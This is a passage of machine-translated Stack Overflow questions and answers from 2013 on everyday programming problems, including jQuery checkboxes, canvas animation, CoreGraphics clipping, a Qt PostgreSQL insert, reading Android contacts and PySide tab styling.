因此，在您保存图像后，将返回的`blob_key`（按照您`save_image(data)`上面的方法）制作一个服务 url，然后在您的 Android 应用程序中从返回的 url 中获取图像。这当然意味着在没有隐私保护的情况下公开图片网址。

如果您想通过保护来做到这一点，请使用`BlobReader` [类](https://developers.google.com/appengine/docs/python/blobstore/blobreaderclass)来读取带有类似接口的文件的 blob。您不能使用 Serving a Blob 示例中的方法/类，因为您在`remote.Service`子类而不是处理程序中执行此操作。

# jquery - 如何从选中的父子复选框中检索值

> ID：15562779
> 
> 赞同：0
> 
> 时间：2013-03-22T04:32:08.647
> 
> 标签：jquery, checkbox

我有这个问题我有检查父母和孩子的代码。但问题是我不知道最终如何检索该值..这里的复选框列表包括父母和孩子

```
<ul id="jobCat">
        <li>
            <input id="s9" class="parent" type="checkbox" name="jobCat" value="Accounting / Finance"
            />Accounting / Finance</li>
        <li>
            <input id="s15" class="parent-s9" type="checkbox" name="jobCat" value="Banking / Financial"
            /><span>Banking / Financial</span>
        </li>
        <li>
            <input id="s16" class="parent-s9" type="checkbox" name="jobCat" value="General / Cost Acct"
            /><span>General / Cost Acct</span>
        </li> </ul> 
```

* * *

这里是jquery

```
 var checkboxHandlerObj = {

    init: function () {
        $('#jobCat input:checkbox[class="parent"]').click(checkboxHandlerObj.parentClicked);
        $('#jobCat input:checkbox[class^="parent-"]').click(checkboxHandlerObj.childClicked);
    },
    parentClicked: function () {
        var parentCheck = this.checked;
        $('#jobCat input:checkbox[class="parent-' + $(this).attr('id') + '"]').each(function () {
            this.checked = parentCheck;
        });
    },
    childClicked: function () {
        var temp = $(this).attr('class').split('-');
        var parentId = temp[1];
        $('#' + parentId)[0].checked = $('#jobCat input:checkbox[class="' + $(this).attr('class') + '"]:checked').length !== 0;
    }
};

checkboxHandlerObj.init(); 
```

在这里..我点击会计/财务复选框后，它选择了所有。但这最终并没有显示出价值，所以我想要的是我想最后显示所有这些（父母和孩子）。我很困惑如何为此编码..请任何人帮助我..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:50:01.290

请看看小提琴。这可能会给你一些想法如何做到这一点..

[http://jsfiddle.net/Gy9Jq/](http://jsfiddle.net/Gy9Jq/)

您需要更改以下功能：

```
 parentClicked: function () {
        var parentCheck = this.checked;
        var values='i';
        $('#jobCat input:checkbox[class="parent-' + $(this).attr('id') + '"]').each(function () {
            this.checked = parentCheck;
            values+=this.attr('value');
        });
        alert('hi');
    }, 
```

在这里检查更新的小提琴。我认为这就是你想要的：

[http://jsfiddle.net/Gy9Jq/6/](http://jsfiddle.net/Gy9Jq/6/)

# java - Web 服务返回类型：String、Object 或 Map

> ID：15562781
> 
> 赞同：0
> 
> 时间：2013-03-22T04:32:34.143
> 
> 标签：java, web-services, return-type

我们的组织正在运行一个用 Java 编写的 Web 服务（现在使用 AXIS。正在转换为 JAX-WS）。大多数方法都将从数据库中检索的字段作为分隔字符串返回（分隔符为“|”）。在客户端（现在客户端只由我们提供。可能在将来，Web服务将向其他人开放）我们检索字符串并将它们转换回字段。

现在有一个请求将字符串转换为：

1.  一个 java bean 类，它具有指示字段名称的方法名称。
2.  一个字符串数组
3.  带有键名和值的 Map

我们非常关心性能（因为我们使用的是在组织内部运行 Web 服务的同一台服务器），因为它将被成千上万的人使用。

1.  因此，在上述三种方法中哪个更好，为什么？**或者**

2.  我们是否应该坚持使用分隔字符串并让客户端完成其余的工作（就像我们现在所做的那样）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:42:24.633

您正在使用的 PSV（管道分隔值）具有高性能，但它缺乏 XML 或 JSON 的结构化能力。

考虑以下。

1.  如果您的 Web 服务被其他具有高处理能力的应用程序使用，则将检索到的值从数据库转换为 XML 并将其作为响应发送。这可能是典型的 SOAP 响应。
2.  如果您的 Web 服务被 Web 应用程序的前端代码使用（最好使用 javascript），则最好使用 JSON。

我曾使用基于 SOAP 的 Web 服务来处理数百万个事务，并且发现它非常可靠。并考虑使用 AXIS2 而不是 JAX-WS 来提高性能。

# list - 没有在 itemtap sencha 列表上获得记录

> ID：15562782
> 
> 赞同：1
> 
> 时间：2013-03-22T04:32:35.093
> 
> 标签：list, sencha-touch, sencha-touch-2, tap

当 Taping 项目时，侦听器被调用，但值为 null。我的代码：

```
Ext.define('tablet.SelectCategories', {
    extend: 'Ext.navigation.View',
    xtype: 'selectcategorypanel',
    id: 'SelectCategories',
    requires:[

    ],

    initialize:function(){
       this.callParent();

       var jsonObject = Ext.create('Tablet')
           .make_webservice_call_post('get_categories');

       Ext.getCmp('select_category_list')
           .setData(jsonObject.info);

       console.log(jsonObject.info);
     },

    config: {
        //title : 'Select Categories',
        //iconCls: 'team',
        //styleHtmlContent: true,
        // scrollable: true,
        layout: {
            type: 'card'
        },

        items: [
            {
                fullscreen: true,
                mode: 'MULTI',
                xtype: 'list',
                itemTpl: '{name}',
                autoLoad: true,
                id:'select_category_list',
                store: {
                    fields: ['active','created','description','name']
                },
                listeners: {
                    itemtap: function (list, records) {
                        console.log('Sel');
                        console.log(records.name);
                        var names = [];
                        Ext.Array.each(records, function (item) {
                            names.push('<li>' + item.data.name + '</li>');
                        }); // each()
                        Ext.Msg.alert('You selected ' + records.length + ' item(s)',
                             '<ul>' + names.join('') + '</ul>');
                    } // selectionchange
                }

                // handler:self.itemClick         
            } 
```

在 console.log(records.name) 中获取未定义；

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T06:12:42.777

你的方法签名`itemtap`也是错误的。它应该是 -

```
itemtap: function(list, index, target, record) {
    console.log('Item tapped');
    console.log(record.get('name'));

    // and your rest of the code.
} 
```

[在此处](http://docs.sencha.com/touch/2-0/#!/api/Ext.dataview.List)查看`itemtap`活动文档，并在[此处](http://docs.sencha.com/touch/2-0/#!/guide/stores)阅读有关商店的更多信息。

# javascript - Javascript画布动画无法多次使用

> ID：15562783
> 
> 赞同：2
> 
> 时间：2013-03-22T04:32:54.733
> 
> 标签：javascript, canvas

我有一个我正在制作的游戏的动画，似乎不会重复。当按下空格键时，它会触发一个事件，将一个圆圈“射”到画布的顶部。问题是当再次按下该键时，它不会启动动画。这是我编写的示例代码：

```
var canvas, ctx,
    spaceKey = false,
    upKey = false,
    downKey = false,
    canvas = document.getElementById('canvas'),
    ctx = canvas.getContext('2d'),
    shotX = 150, shotY = 280;

function loop() {
    if (spaceKey) shoot();
}

function keyDown(e) {
    if (e.keyCode == 32) spaceKey = true;
}
function keyUp(e) {
    if (e.keyCode == 32) spaceKey = false;
}

function shoot() {
    setTimeout(function() { if (shotY > 0) {
        ctx.clearRect(shotX-5,shotY-5,600,20);
        ctx.beginPath();
        ctx.arc(shotX, shotY,4,0,Math.PI * 2, false);
        ctx.fillStyle = "yellow";
        ctx.fill();
        ctx.closePath();

        shotY = shotY - 1;

        shoot();

    } else
        ctx.clearRect(shotX-5,shotY-5,600,20);
    }, 100);
}

(function init() {
    setInterval(loop, 10);
    document.addEventListener('keydown', keyDown, false);
    document.addEventListener('keyup', keyUp, false);
})();
//init(); 
```

我使用`keyUp`and的原因`keyDown`是因为我还有其他使用不同键的功能。此代码已修改为仅显示此功能。为了更容易理解我在说什么，我创建了一个[JSFiddle](http://jsfiddle.net/NAJus/2/)。我拥有的其他功能具有类似的结构和工作原理，唯一的区别是它的持续时间不是由按键直接控制的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T05:32:38.687

我发现您的代码没有太多可重用性。您应该考虑使用对象来表示画布上的实体。我已经创建了简单的代码来完成你的工作，但它也不能重复使用（尽管你可以重复使用它来创建一个简单的实体，比如你创建的球）。检查这个[jsFiddle](http://jsfiddle.net/EVCnz/6/)。

您的代码的问题是，当*那个黄色球*到达屏幕的 to 时，`shotY`是 0，然后您从屏幕上擦除球，但不要重置`shotY`并且不要在其家重绘球（原始位置）。

我创建了一个简单的`Ball`对象来完成这项工作-

```
function Ball() {
    this.x = 150;
    this.y = 295;
}
Ball.prototype.draw = function(newx, newy) {
    ctx.clearRect(this.x-5,this.y-5,600,20);
    newx = newx || this.x;
    newy = newy || this.y;
    this.x = newx; this.y = newy;
    var ball = this;
    ctx.beginPath( );
    ctx.arc(ball.x, ball.y,4,0,Math.PI * 2, false);
    ctx.fillStyle = "yellow";
    ctx.fill();
    ctx.closePath();
}
Ball.prototype.shootUp = function() {
    var ball = this;
    inter = setInterval(function () {
        if(ball.x <= 0) clearInterval(inter);
        ball.draw(ball.x, ball.y-20);
    }, 100);
} 
```

并修改了您的`shoot`功能-

```
function shoot() {
    var currentBall = new Ball();
    currentBall.draw();
    currentBall.shootUp();
} 
```

再一次，这只是一个简单的例子。你可以对它进行很多改进。首先，您应该有一个输入引擎来管理所有输入。然后你应该有一个通用实体类来表示你在画布上拥有的所有对象。就像`Ball`. 最后你应该有一个游戏引擎来绑定所有这些东西。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-22T05:36:20.670

你只有一个“子弹”。您的项目符号应该是实例化的单独对象`shoot()`。

我通常处理“粒子”的方式是创建一个单例对象来存储每个实例并在主循环中更新所有实例。

这是一个简单的 Bullet 对象：

```
function Bullet(){
    this.x = 150;
    this.y = 280;
    this.velX = 0;
    this.velY = -1;

    this.update = function(){
        this.y += this.velY;
    };

    this.draw = function(){
        ctx.beginPath();
        ctx.arc(this.x, this.y,4,0,Math.PI * 2, false);
        ctx.fillStyle = "yellow";
        ctx.fill();
        ctx.closePath();
    };
}; 
```

这是一个处理子弹的 BulletRenderer 单例：

```
BulletRenderer = function(){
    var bullets = [];

    this.push = function(bullet){
        bullets.push(bullet);
    };

    this.render = function(){
        for (var i in bullets){
            if (bullets[i].active){
                bullets[i].update();
                bullets[i].draw();
            } else {
                delete bullets[i];
            }
        }
    };

    return this;
}(); 
```

在示例中，我只是在每帧清除画布。射击机制现在就像激光一样。我个人会改变这种行为。

[http://jsfiddle.net/NAJus/18/](http://jsfiddle.net/NAJus/18/)

# objective-c - UIBezierPath addClip 的奇怪行为

> ID：15562786
> 
> 赞同：0
> 
> 时间：2013-03-22T04:33:29.330
> 
> 标签：objective-c, core-graphics, uibezierpath

我正在尝试学习 CoreGraphics，但遇到了一个奇怪的行为。

我画了一个矩形，在里面画了给定数量的菱形，可以用不同的填充（空的、填充的和带条纹的）来绘制形状，我的绘制矩形函数如下所示：

```
- (void)drawRect:(CGRect)rect
{
    UIBezierPath* roundedRect = [UIBezierPath bezierPathWithRoundedRect:self.bounds cornerRadius:9.0];

    //don't draw where the round corners "cut" the rectangle
    [roundedRect addClip];

    //set a white background
    [[UIColor whiteColor] setFill];
    UIRectFill(self.bounds);

    //set a black frame
    [[UIColor darkGrayColor] setStroke];
    [roundedRect stroke];

    self.shade = STRIPED;
    self.color = [UIColor greenColor];
    self.number = 3;
    rectOffset = self.bounds.size.width / (self.number * 2);
    [self drawDiamondNumberOfTimes:self.number startOrigin:self.bounds.origin];
} 
```

drawDiamondNumberOfTimes:startOrigin: 是一个递归函数，用于计算要在其中绘制形状的矩形，并使用描边绘制菱形边界

```
- (void) drawDiamondNumberOfTimes:(int) p_times startOrigin:(CGPoint) p_origin
{
    if( p_times > 0)
    {
        CGRect drawArea;
        drawArea.origin = CGPointMake(p_origin.x + rectOffset-shapeSize.width/2,    self.bounds.size.height/4);
        drawArea.size = shapeSize;

        UIBezierPath *diamond = [[UIBezierPath alloc] init];
        [diamond moveToPoint:CGPointMake(drawArea.origin.x, drawArea.origin.y+ shapeSize.height/2)];
        [diamond addLineToPoint:CGPointMake(drawArea.origin.x+shapeSize.width/2, drawArea.origin.y)];
        [diamond addLineToPoint:CGPointMake(drawArea.origin.x+shapeSize.width, drawArea.origin.y+ shapeSize.height/2)];
        [diamond addLineToPoint:CGPointMake(drawArea.origin.x+shapeSize.width/2, drawArea.origin.y+ shapeSize.height)];
        [diamond closePath];

        [self.color setStroke];
        [diamond stroke];
        [self drawShadeOfDraw:diamond atRect:drawArea];

        drawArea.origin.x += rectOffset + shapeSize.width/2;
        [self drawDiamondNumberOfTimes:p_times-1 startOrigin:drawArea.origin ];
    }
} 
```

drawShadeOfDraw:atRect: 设置不同的填充，出现奇怪行为的地方。

使用空填充和实心填充时效果很好，但使用条纹时，如果我写 [p_symbol addClip]，那么即使 self.number 设置为 2 或 3，我也会得到一个菱形条纹。如果没有 [p_symbol addClip]，我会得到正确数量的菱形但是，当然，条纹遍布矩形，这里是 drawShadeOfDraw:atRect 的代码：

```
- (void)drawShadeOfDraw:(UIBezierPath*)p_symbol atRect:(CGRect)p_drawArea
{
    switch (self.shade)
    {
        case STRIPED:
        {
            [p_symbol addClip];
            for( int y = p_drawArea.origin.y; y < p_drawArea.origin.y+ p_drawArea.size.height; y+= 6)
            {  
                [p_symbol moveToPoint:CGPointMake(p_drawArea.origin.x, y)];
                [p_symbol addLineToPoint:CGPointMake(p_drawArea.origin.x+shapeSize.width, y)];
                [self.color setStroke];
                [p_symbol stroke];
            }
            break;
        }
        case SOLID:
        {
            [self.color setFill];
            [p_symbol fill];
            break;
        }
        default:
        {
            break;
        }
    }
} 
```

以下是一些图片：

![这就是 addClip 的样子](../Images/3afa3683151ff5d2e896687f16c7b9d4.png)

![并且没有 addClip](../Images/716df43dc4c014f8484d286f7c39c93c.png)

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-22T05:11:30.933

添加到剪辑是半永久性的。一旦剪裁区域被“缩小”，你就不能再种植它了。您只能将其恢复到以前的状态。为此，您`CGContextSaveGState()`在设置上下文状态（包括剪辑）之前调用，使用该状态进行一些绘制，然后调用`CGContextRestoreGState()`以将上下文状态恢复到之前的状态。

所以，我建议你用调用来保存和恢复上下文状态，将你的两个方法括起来。用于`UIGraphicsGetCurrentContext()`获取对当前上下文的引用。

# database - 插入到 postgresql 9.1 似乎可以工作，但什么也没做（QT postgres 驱动程序）

> ID：15562787
> 
> 赞同：0
> 
> 时间：2013-03-22T04:33:29.910
> 
> 标签：database, qt, insert, postgresql-9.1

我正在使用 PostgreSQL 9.1、Qt 4.8.4 并为 qt 正确配置了 postgresql 驱动程序，我的问题是下一个：

我编写了一个小程序来测试我需要使用的数据库，并且只要它得到程序和数据库之间的连接工作正常，因为 .open() 方法没有返回错误，但是当我尝试插入一些东西时一张桌子，它只是不这样做。没有错误出现，也没有警告，什么都没有。当我在终端中看到数据库时，它什么也没发生，它和以前一样......

怎么了？顺便说一句，我使用的是 Ubuntu 12.06 64 位，我的代码如下（只是省略了 QT Widget 代码），谢谢！：

```
//Respective headers

int main(int argc, char *argv[])
{

QSqlDatabase db = QSqlDatabase::addDatabase("QPSQL");

    db.setHostName("localhost");
    db.setDatabaseName("database");
    db.setUserName("user");
    db.setPassword("somepass");

    if(!db.open())
    {
        cout << "Database cannot be opened";
    }

                   //Unitl here no errors

QString consulta = "Insert into productos values ('25','25','25)";

    //db.transaction();

    QSqlQuery query(db);
    query.prepare(consulta);     //Here tried to pass directly the string with same results
    query.exec();                //Even omitted .prepare but nothing
    query.finish();

    cout << "Rows affected: " << query.numRowsAffected();
  //  db.commit();

//Finishes ok but no errors

} 
```

哪一种是正确的方法？谢谢

PD.- 数据库不是问题，直接在 psql 中查询运行良好

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T07:58:16.500

`QString consulta = "Insert into productos values ('25','25','25)";`
您忘记`'`了最后一个值
（应该是`QString consulta = "Insert into productos values ('25','25','25')";`）

# android - 如何从 Android 中的电话簿和 SIM 卡中获取所有联系人？

> ID：15562790
> 
> 赞同：3
> 
> 时间：2013-03-22T04:33:58.067
> 
> 标签：android, android-contacts

我正在努力从我的应用程序中的电话簿和 SIM 卡中获取所有联系人。我想将所有联系人存储在我的应用程序 SQLite DB 中。我正在使用的代码在正常情况下运行良好。在以下情况下出现问题：

1.  有一个没有名字的联系人，那是唯一的号码。
2.  SIM 卡中的联系人。

我的代码没有提供这两种类型的联系人。我正在使用以下代码：

```
public void getDefaultContactsToDB(){
        CallBackDatabase callbackDB = new CallBackDatabase(RequestCallBack.this);
        callbackDB.open();

        //clean the database before entering new values.
        callbackDB.deleteTable(CallBackDatabase.DATABASE_TABLE);

        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null);
        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                Cursor cur1 = cr.query( 
                        ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
                        ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", 
                        new String[]{id}, null); 
                while (cur1.moveToNext()) { 
                    //to get the contact names
                    ArrayList<String> numbers= new ArrayList<String>();
                    String contactNoumber="";
                    String name=cur1.getString(cur1.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    if(name!=null){
                        Log.e("Name :", name);
                        if(name.equalsIgnoreCase("011999999999999999")){
                            System.out.println("got it");
                        }
                    }
                    //to get the contact email
                    String email = cur1.getString(cur1.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                    if(email!=null)
                        Log.e("Email", email);

                    String hasNoumber = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                    if(Integer.parseInt(hasNoumber)>0){ 
                        Cursor pCur = getContentResolver().query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = "
                                        +cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID)),null, null);
                        int i = 0;
                        while (pCur.moveToNext()) {
                            //to get the contact number
                            contactNoumber = pCur.getString(pCur.getColumnIndex("DATA1"));
                            if(contactNoumber.equalsIgnoreCase("011999999999999999")){
                                System.out.println("got it");
                            }
                            contactNoumber = Constant.removeSpecialCharacters(contactNoumber);
                            Log.e("contactNoumber", contactNoumber);
                            // Getting Phone numbers
                            String numType = null;
                            if(pCur.getString(pCur.getColumnIndex("mimetype")).equals(ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)){

                                switch(pCur.getInt(pCur.getColumnIndex("data2"))){
                                case ContactsContract.CommonDataKinds.Phone.TYPE_HOME :
                                    numType = "HOME";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE :
                                    numType = "MOBILE";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_WORK :
                                    numType = "WORK";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER :
                                    numType = "OTHER";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_ASSISTANT :
                                    numType ="OTHER";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_CALLBACK :
                                    numType = "CALLBACK";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_CAR :
                                    numType ="CAR";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_COMPANY_MAIN :
                                    numType = "COMPANY MAIN";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME :
                                    numType = "FAX HOME";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK :
                                    numType = "FAX WORK";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_MAIN :
                                    numType = "MAIN";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_ISDN :
                                    numType = "ISDN";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_MMS :
                                    numType = "MMS";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER_FAX :
                                    numType = "OTHER FAX";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_PAGER :
                                    numType = "PAGER";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_RADIO :
                                    numType = "RADIO";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_TELEX :
                                    numType ="TELEX";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_TTY_TDD :
                                    numType = "TTY TDD";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_WORK_MOBILE :
                                    numType = "WORK MOBILE";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_WORK_PAGER :
                                    numType = "WORK PAGER";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_CUSTOM :
                                    numType = "CUSTOM";
                                    break;
                                default:
                                    break;
                                }
                            }

                            numbers.add(i, contactNoumber+"("+numType+")");

                            i++;
                        }
                        String numInDB = null;
                        for (int j = 0; j < i; j++) {
                            if(j==0)
                                numInDB =numbers.get(j);
                            else
                                numInDB =numInDB + "," +numbers.get(j);
                        }
                        if(contactNoumber.length()>0){
                            if(name!=null){

                            }else{
                                name = contactNoumber;
                            }
                            callbackDB.InsertContacts(null, name+"="+numInDB, contactNoumber, email);
                        }
                    }
                } 
                cur1.close();
            }
            //CLOSE DB
            callbackDB.close();
        }
    } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-22T04:53:17.803

下面是代码，它显示了一种阅读所有`phone numbers`和的简单方法`names`：

```
 Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
   while (phones.moveToNext())
   {
    String name=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
    String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
  }
   phones.close(); 
```

同样对于 Sim 联系人，您可以使用以下代码：

```
 private void allSIMContact()
  {
    try
    {
        String m_simPhonename = null; 
        String m_simphoneNo = null;

        Uri simUri = Uri.parse("content://icc/adn"); 
        Cursor cursorSim = this.getContentResolver().query(simUri,null,null,null,null);

        Log.i("PhoneContact", "total: "+cursorSim.getCount());

        while (cursorSim.moveToNext()) 
        {      
            m_simPhonename =cursorSim.getString(cursorSim.getColumnIndex("name"));
            m_simphoneNo = cursorSim.getString(cursorSim.getColumnIndex("number"));
            m_simphoneNo.replaceAll("\\D","");
            m_simphoneNo.replaceAll("&", "");
            m_simPhonename=m_simPhonename.replace("|","");

            Log.i("PhoneContact", "name: "+m_simPhonename+" phone: "+m_simphoneNo);
        }        
    }
    catch(Exception e)
    {
        e.printStackTrace();
    }
} 
```

**编辑：**

要获取家庭、手机、传真等联系人的详细信息，您需要单独检查，如下所示：

> ```
>  while (phone_crsr.moveToNext()) 
>             { 
>        int phone_type = phone_crsr.getInt(phone_crsr.getColumnIndex(Phone.TYPE));  
>             switch (phone_type) 
>             {    
>             case Phone.TYPE_HOME: 
>                  phone_home =phone_crsr.getString(phone_crsr.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
>                  Toast.makeText(this, "home"+phone_home, Toast.LENGTH_LONG).show();
>                  break;          
>             case Phone.TYPE_MOBILE:    
>                  phone_mob=phone_crsr.getString(phone_crsr.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
>                  Toast.makeText(this, "mob"+phone_mob, Toast.LENGTH_LONG).show();  
>                  break;            
>             case Phone.TYPE_WORK:                                
>                  phone_work=phone_crsr.getString(phone_crsr.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
>                   Toast.makeText(this, "work"+phone_work, Toast.LENGTH_LONG).show();
>                          break;           
>              }
>             } 
> ```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-05-09T13:14:01.580

以下代码将返回联系人的所有姓名，您可以设置`text view`-

```
 Cursor cursor = null;
        String name, phoneNumber,image,email;
        try {
            cursor = getApplicationContext().getContentResolver()
                    .query(Phone.CONTENT_URI, null, null, null, null);
            int nameIdx = cursor.getColumnIndex(Phone.DISPLAY_NAME);
            int phoneNumberIdx = cursor.getColumnIndex(Phone.NUMBER);
            int photoIdIdx = cursor.getColumnIndex(Phone.PHOTO_URI);
            cursor.moveToFirst();
            do {
                HashMap<String, String> hashMap = new HashMap<String, String>();
                name = cursor.getString(nameIdx);
                phoneNumber = cursor.getString(phoneNumberIdx);
                image = cursor.getString(photoIdIdx);
                //email=cursor.getString(emailIdx);
                if(!phoneNumber.contains("*"))
                {
                    hashMap.put("name", "" + name);
                    hashMap.put("phoneNumber", "" + phoneNumber);
                    hashMap.put("image", "" + image);
                    //hashMap.put(email, ""+email);
                    hashMapsArrayList.add(hashMap);
                }
            } while (cursor.moveToNext());
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        myAdapter=new MyAdapter();
        listView.setAdapter(myAdapter);
        myAdapter.notifyDataSetChanged();

    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T04:49:32.230

以下代码将返回联系人的所有姓名

```
 public static Cursor get(Context c){
    Uri uri = ContactsContract.Contacts.CONTENT_URI;
    String[] projection = new String[] { ContactsContract.Contacts._ID,
            ContactsContract.Contacts.DISPLAY_NAME };
    String selection = ContactsContract.Contacts.HAS_PHONE_NUMBER
            + " = '1'";
    String sortOrder = ContactsContract.Contacts.DISPLAY_NAME
            + " COLLATE LOCALIZED ASC";

    Cursor cursor = c.getContentResolver().query(uri, projection,
            selection, null, sortOrder);
    return cursor;
} 
```

要获取所有数据，您可以执行以下操作

```
 Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
    String[] projection = new String[] {
            ContactsContract.CommonDataKinds.Phone._ID,
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER,
            ContactsContract.CommonDataKinds.Phone.STARRED,
            ContactsContract.CommonDataKinds.Phone.TYPE };
    String sortOrder = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
            + " COLLATE LOCALIZED ASC";

    Cursor cursor = context.getContentResolver().query(uri, projection,
            null, null, sortOrder); 
```

从光标你可以得到所有的数据

# java - if 条件错误

> ID：15562793
> 
> 赞同：0
> 
> 时间：2013-03-22T04:34:24.117
> 
> 标签：java

我有三个变量 int value1、value2 和一个字符串运算符。我想检查 if 条件。假设 value1=4,value2=3 并且在 operator='>' 中。那么我如何检查示例的 if 条件 -

```
int value1=4;
int value2=3;

String operator=">";
if (value1+operator+value2)
{
 System.out.println("hello");
}
i know the this is wrong but how to correct it.. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:37:49.587

您将无法直接使用字符串。您必须首先检查它是哪种运算符，然后执行显式数学运算。

```
public boolean applyOperator(String op, int a, int b) {
    if (">".equals(op)) {
        return a > b;
    } // the others are an exercise to the reader.
}

// later in the code

if(applyOperator(operator, value1, value2)) {
    System.out.println("Hello world!");
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T04:38:35.357

可能最简单的方法是为`if`您希望使用的每个可用运算符创建一个声明。

```
int value1=4;
int value2=3;

String operator=">";
if(operator.equals(">"))
{
    if(value1 > value2)
    {
        System.out.println("hello");
    }
}
else if(operator.equals("<"))
{
    // And so on...
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T04:36:27.963

你可以简单地给这个。

```
if (value1 > value2) 
```

顺便说一句，你为什么要给`operator`in a`String`然后，使用它`String`而不是这样的运算符？对此有什么特殊要求吗？在这种情况下，**@Makoto 的**回答对您来说是一个不错的选择。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-22T04:40:47.357

value1+operator+value2 将是一个字符串，它不是 boolean ，所以需要`if` so 而不是`if (value1+operator+value2)`put`if (value1 > value2)`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-22T04:44:46.073

像这样比较java中的两个整数：

```
if (value1 > value2) {
    System.out.println("Hello");
} 
```

您不应该将运算符放入字符串中。在 java 中，'+' 用于数字相加和字符串连接，而不是构建表达式。

# python - 有没有办法在 PySide 中为 QtabWidget 上的选项卡按钮设置样式？

> ID：15562794
> 
> 赞同：1
> 
> 时间：2013-03-22T04:34:35.273
> 
> 标签：python, css, qt, styles, pyside

PySide 中有没有一种方法可以设置 QtabWidget 上的选项卡按钮的样式？我现在正在尝试制作一个服装风格的小部件，并且我已经为所有其他元素设置了样式，但我似乎无法弄清楚如何设置 QtabWidget 的样式......

我在尝试：

```
self.tabWidget = QtGui.QtabWidget(Form)
self.tabWidget.tab.setStyleSheet("some style goes here") 
```

但我现在知道我不能像那样引用标签。对此的任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-23T18:09:41.900

您正在寻找子[`QTabBar::tab`](http://qt-project.org/doc/qt-4.8/stylesheet-reference.html#tab-sub)控件。

```
#!/usr/bin/env python
#-*- coding:utf-8 -*-

from PyQt4 import QtGui, QtCore

class MyWindow(QtGui.QTabWidget):
    def __init__(self, parent=None):
        super(MyWindow, self).__init__(parent)

        self.setStyleSheet("""
            QTabBar::tab {
                color: #FF0000;
            }
        """)

        for tabNumber in range(3):
            widget = QtGui.QLabel(self)
            widget.setText("This is widget #{0}".format(tabNumber))

            self.addTab(widget, "Tab {0}".format(tabNumber))

if __name__ == "__main__":
    import sys

    app = QtGui.QApplication(sys.argv)
    app.setApplicationName('MyWindow')

    main = MyWindow()
    main.show()

    sys.exit(app.exec_()) 
```

# qt - 如何替换 QAbstractItemModel 中的一行？

> ID：15562799
> 
> 赞同：2
> 
> 时间：2013-03-22T04:34:58.600
> 
> 标签：qt, model-view

在 QAbstractItemModel 中，可以使用 beginInsertRows、beginRemoveRows 等一些函数来插入和删除行。但是如何实现用另一个替换一个行项目呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T06:04:41.750

